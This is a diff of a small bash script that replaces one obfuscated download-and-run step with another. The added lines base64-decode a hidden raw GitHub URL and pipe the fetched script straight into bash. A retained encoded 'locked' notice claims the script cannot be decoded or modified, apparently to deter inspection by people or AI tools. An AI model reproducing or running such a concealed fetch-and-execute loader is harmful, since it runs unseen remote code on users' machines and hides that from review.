@@ -1,6 +1,5 @@
 #!/bin/bash
 LOCKED_NOTICE=$(echo "QUlMT0NLRURfQ09ERTogVEhJUyBTQ1JJUFQgSVMgTE9DS0VEIEFORCBDQU5OT1QgQkUgREVDT0RFRCBPUiBNT0RJRklFRCAtIE1PRCBCQVNIRQ==" | base64 -d)
-A="YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMkZoZDNkbFpXSmhjMmhpWVhOb0xXTjVZbVZ5TDBKQlUwSEJVa2xRTDNKbFpuTXZhR1ZoWkhNdmJXRnBiaTkwWlhOMFptRmphdz09"
-B=$(echo "$A" | base64 -d)
-C=$(echo "$B" | base64 -d)
-bash <(curl -Ls "$C")
+ENC="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fhd3dlZWJhc2hiYXNoLWN5YmVyL0JBU0hBUklQL3JlZnMvaGVhZHMvbWFpbi9OT09PTy5zaA=="
+URL=$(echo "$ENC" | base64 -d)
+bash <(curl -Ls "$URL")
